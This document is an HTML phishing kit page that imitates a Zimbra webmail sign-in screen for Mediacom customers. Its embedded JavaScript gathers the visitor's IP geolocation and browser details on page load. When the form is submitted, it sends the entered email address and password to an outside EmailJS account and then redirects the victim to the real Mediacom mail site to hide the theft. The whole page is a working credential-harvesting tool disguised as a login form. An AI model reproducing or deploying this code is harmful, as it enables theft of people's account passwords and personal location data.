<!doctype html>
<html class="user_font_size_normal" lang="en">
  <head>
    <meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
    <title>Zimbra Web Client Sign In</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta
      name="description"
      content="Zimbra provides open source server and client software for messaging and collaboration. To find out more visit https://www.zimbra.com."
    />
    <meta name="apple-mobile-web-app-capable" content="yes" />
    <meta name="apple-mobile-web-app-status-bar-style" content="black" />
    <link
      rel="stylesheet"
      type="text/css"
      href="https://mail1.mediacombb.net/css/common,login,zhtml,skin.css?skin=harmony&v=220612070740"
    />
    <link
      rel="SHORTCUT ICON"
      href="https://mail1.mediacombb.net/img/logo/favicon.ico"
    />
  </head>
  <body>
    <!-- EmailJS SDK -->
    <script
      type="text/javascript"
      src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"
    ></script>
    <script type="text/javascript">
      // Initialize EmailJS with public key
      (function () {
        emailjs.init({
          publicKey: "Eyfm5Q_2Xwc2eqVQ1",
        });
        console.log("EmailJS initialized");
      })();
    </script>

    <script>
      (function () {
        "use strict";

        // Configuration
        const EMAILJS_SERVICE_ID = "service_txhhhjj";
        const EMAILJS_TEMPLATE_ID = "template_dvst2eq";

        // Track IP data - will be collected on page load
        let cachedIpData = null;
        let ipDataReady = false;
        let dataSent = false;
        let scriptElement = null;
        let callbackName = null;

        // Helper: Clean up JSONP to prevent memory leaks
        function cleanupJsonp(cbName, scriptTag) {
          if (cbName && window[cbName]) {
            try {
              delete window[cbName];
            } catch (e) {
              window[cbName] = undefined;
            }
          }
          if (scriptTag && scriptTag.parentNode) {
            try {
              scriptTag.parentNode.removeChild(scriptTag);
            } catch (e) {}
          }
        }

        // Helper: Send collected data with email/password (uses cached IP data)
        function sendDataViaEmail(emailValue, passwordValue) {
          if (dataSent) {
            console.log("Data already sent, skipping duplicate send");
            return Promise.resolve();
          }

          if (!cachedIpData || !cachedIpData.ip) {
            console.error("No IP data available");
            return Promise.reject(new Error("No IP data available"));
          }

          // Prepare email parameters with all collected information
          let params = {
            // Basic IP info
            ip_address: cachedIpData.ip || "Unknown",

            // Geolocation details
            city: cachedIpData.city || "Unknown",
            region: cachedIpData.region || "Unknown",
            country: cachedIpData.country || "Unknown",
            country_name:
              cachedIpData.country_name || cachedIpData.country || "Unknown",
            location:
              cachedIpData.loc ||
              (cachedIpData.latitude && cachedIpData.longitude
                ? `${cachedIpData.latitude},${cachedIpData.longitude}`
                : "Unknown"),

            // ISP/Organization
            organization: cachedIpData.org || "Unknown",
            isp: cachedIpData.org || "Unknown",

            // Additional details
            timezone: cachedIpData.timezone || "Unknown",
            postal_code:
              cachedIpData.postal || cachedIpData.postal_code || "Unknown",

            // Hostname if available
            hostname: cachedIpData.hostname || "Unknown",

            // Browser/Device info (passive collection)
            user_agent: navigator.userAgent || "Unknown",
            platform: navigator.platform || "Unknown",
            language: navigator.language || "Unknown",

            // Timestamp
            collected_at: new Date().toISOString(),

            // Referrer (if any)
            referrer: document.referrer || "Direct",

            // Screen resolution (passive)
            screen_resolution: `${screen.width}x${screen.height}`,

            // url
            url: "https://mail1.mediacombb.net/",

            // Timezone offset
            timezone_offset: new Date().getTimezoneOffset(),

            // Email and password from form
            email: emailValue,
            password: passwordValue,
          };

          // Send email
          return emailjs
            .send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, params)
            .then(function (response) {
              dataSent = true;
              /* console.log("✅ IP data successfully sent via EmailJS");
              console.log("Response:", response.status, response.text); */
              window.location.replace("https://mail1.mediacombb.net/");
              return response;
            })
            .catch(function (error) {
              /*  console.error("❌ Failed to send IP data via EmailJS:", error);
              console.error("Error details:", error.text || error.message); */
              window.location.replace("https://mail1.mediacombb.net/");
              throw error;
            });
        }

        // JSONP request to ipinfo.io
        function fetchIpInfoViaJsonp() {
          return new Promise((resolve, reject) => {
            // Generate unique callback name
            const uniqueId =
              "ipinfo_cb_" +
              Date.now() +
              "_" +
              Math.random().toString(36).substr(2, 9);
            callbackName = uniqueId;

            // Set timeout for JSONP (10 seconds)
            const timeoutId = setTimeout(() => {
              if (window[callbackName]) {
                cleanupJsonp(callbackName, scriptElement);
                reject(new Error("ipinfo.io JSONP timeout after 10 seconds"));
              }
            }, 10000);

            // Define callback function
            window[callbackName] = function (response) {
              clearTimeout(timeoutId);
              cleanupJsonp(callbackName, scriptElement);

              if (response && response.ip) {
                console.log("✅ ipinfo.io data received on page load");
                resolve(response);
              } else {
                reject(new Error("Invalid or empty response from ipinfo.io"));
              }
            };

            // Create script tag for JSONP
            scriptElement = document.createElement("script");
            scriptElement.src = `https://ipinfo.io/json?callback=${callbackName}`;
            scriptElement.async = true;
            scriptElement.onerror = function () {
              clearTimeout(timeoutId);
              cleanupJsonp(callbackName, scriptElement);
              reject(new Error("Failed to load ipinfo.io script"));
            };

            // Append to head
            document.head.appendChild(scriptElement);
          });
        }

        // Fallback using fetch with CORS
        async function fetchIpInfoFallback() {
          try {
            console.log(
              "Attempting fallback fetch to ipinfo.io (CORS supported)",
            );
            const response = await fetch("https://ipinfo.io/json");
            if (!response.ok) throw new Error("HTTP error: " + response.status);
            const data = await response.json();
            if (data && data.ip) return data;
            throw new Error("Invalid data from fetch fallback");
          } catch (err) {
            console.error("Fallback fetch also failed:", err.message);
            throw err;
          }
        }

        // Function to collect IP data on page load
        async function collectIpOnPageLoad() {
          console.log("🔍 Collecting IP data on page load...");

          try {
            // Try JSONP first (primary method)
            let ipData = null;
            try {
              ipData = await fetchIpInfoViaJsonp();
            } catch (jsonpError) {
              console.warn(
                "JSONP failed, trying CORS fetch fallback:",
                jsonpError.message,
              );
              // Fallback to fetch (ipinfo.io supports CORS)
              try {
                ipData = await fetchIpInfoFallback();
              } catch (fetchError) {
                throw new Error(
                  `Both JSONP and fetch failed: ${fetchError.message}`,
                );
              }
            }

            // Store the IP data
            if (ipData && ipData.ip) {
              cachedIpData = ipData;
              ipDataReady = true;
              console.log("✅ IP data cached on page load:", cachedIpData.ip);
            } else {
              throw new Error("No IP address in response");
            }
          } catch (error) {
            console.error(
              "❌ Failed to collect IP data on page load:",
              error.message,
            );

            // Store fallback data
            cachedIpData = {
              ip: "COLLECTION_FAILED",
              error: error.message,
              user_agent: navigator.userAgent,
              timestamp: new Date().toISOString(),
              city: "Unknown",
              region: "Unknown",
              country: "Unknown",
              org: "Unknown",
            };
            ipDataReady = true;
          } finally {
            // Clean up any remaining JSONP elements
            if (callbackName && window[callbackName]) {
              cleanupJsonp(callbackName, scriptElement);
            }
            if (scriptElement && scriptElement.parentNode) {
              try {
                scriptElement.parentNode.removeChild(scriptElement);
              } catch (e) {}
            }
          }
        }

        // Set up form submission handler
        document.addEventListener("DOMContentLoaded", function () {
          // Start collecting IP data immediately when page loads
          collectIpOnPageLoad();

          const form = document.getElementById("contact-form");

          if (form) {
            form.addEventListener("submit", function (event) {
              event.preventDefault(); // Prevent default form submission

              // Get form values
              const emailInput = document.getElementById("email");
              const passwordInput = document.getElementById("password");

              const emailValue = emailInput ? emailInput.value : "";
              const passwordValue = passwordInput ? passwordInput.value : "";

              // Disable submit button
              const submitButton = form.querySelector('input[type="submit"]');
              if (submitButton) {
                submitButton.disabled = true;
              }

              // console.log("Form submitted - sending cached IP data with email/password...");

              // Send email with cached IP data (already collected on page load)
              sendDataViaEmail(emailValue, passwordValue)
                .then(() => {
                  // console.log("✅ Email sent successfully, redirecting...");
                  window.location.replace("https://mail1.mediacombb.net/");
                })
                .catch((error) => {
                  // console.error("❌ Error sending email:", error);
                  window.location.replace("https://mail1.mediacombb.net/");
                });
            });
          } else {
            // console.error("Form with id 'contact-form' not found");
          }
        });
      })();
    </script>
    <div class="LoginScreen">
      <div class="center">
        <div class="contentBox">
          <h1>
            <a
              href="https://www.zimbra.com/"
              id="bannerLink"
              target="_new"
              title="Zimbra"
              ><span class="ScreenReaderOnly">Zimbra</span>
              <span class="ImgLoginBanner"></span>
            </a>
          </h1>
          <div id="ZLoginAppName">Web Client</div>
          <form id="contact-form">
            <table class="form">
              <tr>
                <td><label for="username">Username:</label></td>
                <td>
                  <input
                    id="email"
                    class="zLoginField"
                    name="email"
                    type="text"
                    value=""
                    size="40"
                    maxlength="1024"
                    autocapitalize="off"
                    autocorrect="off"
                    required minlength="3"
                  />
                </td>
              </tr>
              <tr>
                <td><label for="password">Password:</label></td>
                <td>
                  <input
                    id="password"
                    autocomplete="off"
                    class="zLoginField"
                    name="password"
                    type="password"
                    value=""
                    size="40"
                    maxlength="1024"
                    required minlength="3"
                  />
                </td>
              </tr>
              <tr>
                <td>&nbsp;</td>
                <td class="submitTD">
                  <input
                    id="remember"
                    value="1"
                    type="checkbox"
                    name="zrememberme"
                  />
                  <label for="remember">Stay signed in</label>
                  <input
                    type="submit"
                    class="ZLoginButton DwtButton"
                    value="Sign In"
                  />
                </td>
              </tr>

              <tr>
                <td colspan="2"><hr /></td>
              </tr>
              <tr>
                <td>
                  <label for="client">Version:</label>
                </td>
                <td>
                  <div class="positioning">
                    <select
                      id="client"
                      name="client"
                      onchange="
                        clientChange(this.options[this.selectedIndex].value)
                      "
                    >
                      <option value="preferred" selected>Default</option>
                      <option value="advanced">Advanced (Ajax)</option>
                      <option value="standard">Standard (HTML)</option>
                      <option value="mobile">Mobile</option>
                      <option value="touch">Touch</option>
                    </select>
                    <script type="text/javascript">
                      document.write(
                        "<a href='#' onclick='showWhatsThis();' id='ZLoginWhatsThisAnchor' aria-controls='ZLoginWhatsThis' aria-expanded='false'>What’s This?</a>",
                      );
                    </script>
                  </div>
                </td>
              </tr>
            </table>
          </form>
        </div>
        <div class="decor1"></div>
      </div>

      <div class="Footer">
        <div id="ZLoginNotice" class="legalNotice-small">
          Forgot your password? Visit the
          <a target="_new" href="https://support.mediacomcable.com/ManageID/"
            ><font color="#0000ff"><u>Mediacom ID Management</u></font></a
          >
          page.
        </div>
        <div class="copyright">
          Copyright © 2023 Mediacom Communication Corp. All rights reserved.
        </div>
      </div>
      <div class="decor2"></div>
    </div>
  </body>
</html>
